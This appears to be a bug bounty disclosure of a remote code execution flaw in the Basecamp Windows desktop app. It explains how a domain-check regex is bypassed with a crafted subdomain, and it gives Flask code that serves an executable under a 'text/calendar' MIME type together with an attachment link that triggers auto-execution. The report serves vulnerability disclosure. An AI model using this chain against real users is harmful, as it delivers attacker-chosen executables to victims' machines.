  "vulnerability_information": "The Windows application for Basecamp, allows a \"Download\" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.\n\nI was able to craft a link, which when clicked by a user, will be downloaded and executed! \n\nTo get file execution on the user, we bypass the restrictions first:\nThere is a regular expression which checks for \"internal domains\", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\\.37signals\\.com|launchpad\\.(?:dev|test))/` and `/(3\\.(?:staging\\.)?basecamp\\.com|bc3\\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.\n\nSince we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set([\"text/calendar\"]);`\nAnd then when adding the URL to your post, simply add the `?attachment=true` to the URL. \n\n\nTo reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).\nAn HTTP server with the needed mimetype header, can be setup with Flask easily with this code:\n```\nfrom flask import Flask, send_from_directory\napp = Flask(__name__)\n@app.route('/<path:path>')\ndef hello(path):\n    return send_from_directory(\".\", \"file.exe\", as_attachment=True, mimetype=\"text/calendar\")\nif __name__ == '__main__':\n    app.run(port=80,host=\"0.0.0.0\")\n```\n\nThen add the link to your post with the appropriate `attachment` parameter, as such:\n`http://launchpad.dev.█████████/file.exe?attachment=true`\n\n## Impact\n\nRemote code execution on any user which clicks a link on your crafted post through the desktop app.",
